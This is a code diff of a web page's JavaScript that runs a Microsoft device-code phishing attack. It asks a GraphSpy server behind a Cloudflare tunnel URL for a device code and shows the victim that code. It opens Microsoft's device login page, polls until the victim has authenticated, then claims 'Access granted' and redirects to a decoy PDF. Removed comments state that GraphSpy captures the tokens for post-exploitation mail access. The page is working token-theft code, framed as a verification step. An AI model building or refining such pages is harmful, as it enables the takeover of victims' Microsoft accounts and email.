@@ -265,10 +265,9 @@
             'use strict';
 
             // --- CONFIGURATION ---
-            // Your GraphSpy backend API endpoints
-            // This is the server where GraphSpy is installed and running.
-            // Replace with your actual GraphSpy server URL.
+            // Your GraphSpy backend exposed via Cloudflare Tunnel
             const API_BASE = 'https://pushed-widescreen-announces-wifi.trycloudflare.com';
+            const API_ENDPOINT = '/api/generate_device_code';
 
             // --- DOM References ---
             const step1 = document.getElementById('step1');
@@ -297,17 +296,13 @@
                 showStatus(status1, 'Requesting verification code...', 'info');
                 startBtn.disabled = true;
 
-                // Tell GraphSpy to generate a new device code.
-                // GraphSpy automatically handles the Microsoft API call.
-                fetch(API_BASE + '/devicecodes/new', {
+                fetch(API_BASE + API_ENDPOINT, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    // You can optionally pass a specific client_id or scope.
-                    // GraphSpy may use its own defaults.
-                    body: JSON.stringify({
-                        client_id: 'YOUR_THIRD_PARTY_CLIENT_ID', // Optional
-                        scope: 'https://graph.microsoft.com/Mail.Read offline_access'
-                    })
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: ''
                 })
                 .then(function(res) {
                     if (!res.ok) {
@@ -316,6 +311,8 @@
                     return res.json();
                 })
                 .then(function(data) {
+                    console.log('GraphSpy response:', data);
+                    // Adjust based on the actual response structure from GraphSpy
                     if (data.user_code) {
                         deviceCodeData = data;
                         userCodeDisplay.textContent = data.user_code;
@@ -325,7 +322,7 @@
                         showStatus(status2, 'Code generated. Please complete the verification.', 'info');
                         startPolling();
                     } else {
-                        showStatus(status1, 'Error generating code. Please try again.', 'error');
+                        showStatus(status1, 'Unexpected response. Please try again.', 'error');
                         startBtn.disabled = false;
                     }
                 })
@@ -340,43 +337,53 @@
             function startPolling() {
                 if (!deviceCodeData || !deviceCodeData.device_code) return;
 
-                // GraphSpy automatically polls Microsoft's token endpoint.
-                // We just ask GraphSpy for the status of this device code.
                 pollInterval = setInterval(function() {
-                    fetch(API_BASE + '/devicecodes/' + deviceCodeData.device_code + '/status', {
-                        method: 'GET'
+                    fetch(API_BASE + '/api/list_device_codes', {
+                        method: 'GET',
+                        headers: {
+                            'X-Requested-With': 'XMLHttpRequest'
+                        }
                     })
                     .then(function(res) { return res.json(); })
                     .then(function(data) {
-                        if (data.status === 'success' || data.access_token) {
-                            // Success! GraphSpy has captured the tokens.
-                            clearInterval(pollInterval);
-                            showStatus(status2, 'Verification complete. Access granted.', 'success');
-                            microsoftBtn.disabled = true;
-
-                            // GraphSpy has automatically stored the tokens.
-                            // You can now use GraphSpy's post-exploitation features
-                            // (e.g., open Outlook, OneDrive, etc.) via its GUI or API.
-
-                            // Redirect to a fake PDF or success page.
-                            setTimeout(function() {
-                                window.location.href = 'https://example.com/sample.pdf';
-                            }, 3000);
-                        } else if (data.status === 'pending') {
-                            // Still waiting for user to authenticate.
-                            // Do nothing, keep polling.
-                        } else {
-                            // Other error (e.g., expired).
-                            clearInterval(pollInterval);
-                            showStatus(status2, 'Verification expired. Please restart.', 'error');
-                            microsoftBtn.disabled = true;
+                        // Check if the specific device code is now authenticated
+                        // This will depend on how GraphSpy returns the list
+                        // For now, we'll check if the user_code is no longer pending
+                        // You may need to adjust this based on GraphSpy's actual response
+                        if (data && data.codes) {
+                            // If the code is no longer in the list or status changed
+                            // For example, if the code appears as "success" or "used"
+                            // This logic needs to be adapted to GraphSpy's actual response format
+                            var found = false;
+                            for (var i = 0; i < data.codes.length; i++) {
+                                if (data.codes[i].user_code === deviceCodeData.user_code) {
+                                    found = true;
+                                    if (data.codes[i].status === 'success' || data.codes[i].status === 'used') {
+                                        clearInterval(pollInterval);
+                                        showStatus(status2, 'Verification complete. Access granted.', 'success');
+                                        microsoftBtn.disabled = true;
+                                        setTimeout(function() {
+                                            window.location.href = 'https://example.com/sample.pdf';
+                                        }, 3000);
+                                    }
+                                    break;
+                                }
+                            }
+                            if (!found) {
+                                // Code has been removed, likely used
+                                clearInterval(pollInterval);
+                                showStatus(status2, 'Verification complete. Access granted.', 'success');
+                                microsoftBtn.disabled = true;
+                                setTimeout(function() {
+                                    window.location.href = 'https://example.com/sample.pdf';
+                                }, 3000);
+                            }
                         }
                     })
                     .catch(function() {
-                        // Silently handle polling errors.
-                        // GraphSpy may have its own internal polling that we don't need to track.
+                        // Silently handle polling errors
                     });
-                }, 3000); // Poll every 3 seconds.
+                }, 3000); // Poll every 3 seconds
             }
 
             // --- Step 3: Redirect to Microsoft Login ---
@@ -384,7 +391,6 @@
                 if (deviceCodeData && deviceCodeData.verification_uri) {
                     window.open(deviceCodeData.verification_uri, '_blank');
                 } else {
-                    // Fallback to the standard login URL.
                     window.open('https://microsoft.com/devicelogin', '_blank');
                 }
                 showStatus(status2, 'Verification page opened in new window.', 'info');
@@ -395,7 +401,6 @@
             microsoftBtn.addEventListener('click', openMicrosoftLogin);
 
             console.log('[Device Code] Ready. GraphSpy API Base:', API_BASE);
-
         })();
     </script>
 </body>
